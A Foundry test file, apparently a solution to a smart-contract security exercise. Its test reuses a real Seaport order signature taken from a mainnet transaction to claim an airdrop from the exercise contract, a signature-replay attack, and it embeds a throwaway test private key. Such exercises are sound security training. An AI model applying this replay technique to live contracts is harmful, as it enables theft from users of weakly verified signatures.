// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {Week22Exercise4} from "../src/Week22Exercise4.sol";
import {TestHelpers} from "./TestHelper.sol";

import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import "@openzeppelin/contracts/utils/Strings.sol";

contract Week22Exercise4Test is TestHelpers {
    using Strings for uint256;
    using MessageHashUtils for bytes32;
    using ECDSA for bytes32;
    Week22Exercise4 public exercise;

    address owner;
    uint256 privateKey =
        0x1010101010101010101010101010101010101010101010101010101010101010;

    function setUp() public {
        owner = vm.addr(privateKey);
        exercise = new Week22Exercise4();
    }

    // function test_Attack() public {
    //     uint256 amount = 100;

    //     bytes32 msgHash = keccak256(abi.encode(amount))
    //         .toEthSignedMessageHash();

    //     (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, msgHash);

    //     bytes memory signature = abi.encodePacked(r, s, v);
    //     assertEq(signature.length, 65);

    //     exercise.claimAirdrop(100, msgHash, signature);
    // }

    function test_attack() public {
        AdditionalRecipient memory recipient1 = AdditionalRecipient({
            amount: 2375000000000000,
            recipient: payable(0x0000a26b00c1F0DF003000390027140000fAa719)
        });

        AdditionalRecipient memory recipient2 = AdditionalRecipient({
            amount: 4750000000000000,
            recipient: payable(0xCa812530A5A97f2cfb321fBD6F40Da292E9F2045)
        });

        AdditionalRecipient[]
            memory additionalRecipients = new AdditionalRecipient[](2);

        additionalRecipients[0] = recipient1;
        additionalRecipients[1] = recipient2;

        bytes32 startOfSig = 0x5fb612dac8b3b7fc4c4bc4609998000a783483828baaee7e24253582dcfadb01;
        bytes32 middleOfSig = 0x335f6e690f6d8c327769fe53b0fc04fca9bca95ad117985c1c732ff4a6c65a37;
        bytes1 endOfSig = 0x1c;

        bytes memory signature = abi.encodePacked(
            startOfSig,
            middleOfSig,
            endOfSig
        );

        // https://etherscan.io/tx/0x9808718ce84cdcd342b106f39b72be690befa3f0a019a58439cdfa67f786879f

        BasicOrderParameters memory parameters = BasicOrderParameters({
            considerationToken: address(0),
            considerationIdentifier: 0,
            considerationAmount: 87875000000000000,
            offerer: payable(0x818c516C046EAf7a5A432E50eEE11c46BCa03Fcb),
            zone: address(0x004C00500000aD104D7DBd00e3ae0A5C00560C00),
            offerToken: address(0x62674b8aCe7D939bB07bea6d32c55b74650e0eaA),
            offerIdentifier: 6580,
            offerAmount: 1,
            basicOrderType: BasicOrderType(2),
            startTime: 1666268463,
            endTime: 1668946863,
            zoneHash: bytes32(0),
            salt: 24446860302761739304752683030156737591518664810215442929803392085919972899734,
            offererConduitKey: bytes32(
                0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000
            ),
            fulfillerConduitKey: bytes32(
                0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000
            ),
            totalOriginalAdditionalRecipients: 2,
            additionalRecipients: additionalRecipients,
            signature: signature
        });

        // hashes.typeHash = _ORDER_TYPEHASH;

        bytes32 orderHash = 0x3037da4e9949ec07389964478ca398fa059940f23f4e5dff31c2bfedcde9994e;

        address offerer = address(0x818c516C046EAf7a5A432E50eEE11c46BCa03Fcb);

        bytes32 digest = _verifySignature(offerer, orderHash, signature);

        exercise.claimAirdrop(100, digest, signature);

        // hashes.orderHash = _hashOrder(
        //     hashes,
        //     parameters,
        //     fulfillmentItemTypes
        // );
    }
}

// 0	parameters.considerationToken	address	0x0000000000000000000000000000000000000000
// 0	parameters.considerationIdentifier	uint256	0
// 0	parameters.considerationAmount	uint256	87875000000000000
// 0	parameters.offerer	address	0x818c516C046EAf7a5A432E50eEE11c46BCa03Fcb
// 0	parameters.zone	address	0x004C00500000aD104D7DBd00e3ae0A5C00560C00
// 0	parameters.offerToken	address	0x62674b8aCe7D939bB07bea6d32c55b74650e0eaA
// 0	parameters.offerIdentifier	uint256	6580
// 0	parameters.offerAmount	uint256	1
// 0	parameters.basicOrderType	uint8	2
// 0	parameters.startTime	uint256	1666268463
// 0	parameters.endTime	uint256	1668946863
// 0	parameters.zoneHash	bytes32	0x0000000000000000000000000000000000000000000000000000000000000000
// 0	parameters.salt	uint256	24446860302761739304752683030156737591518664810215442929803392085919972899734
// 0	parameters.offererConduitKey	bytes32	0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000
// 0	parameters.fulfillerConduitKey	bytes32	0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000
// 0	parameters.totalOriginalAdditionalRecipients	uint256	2
// 0	parameters.additionalRecipients	tuple	2375000000000000,0x0000a26b00c1F0DF003000390027140000fAa719,4750000000000000,0xCa812530A5A97f2cfb321fBD6F40Da292E9F2045
// 0	parameters.signature	bytes	0x5fb612dac8b3b7fc4c4bc4609998000a783483828baaee7e24253582dcfadb01335f6e690f6d8c327769fe53b0fc04fca9bca95ad117985c1c732ff4a6c65a371c
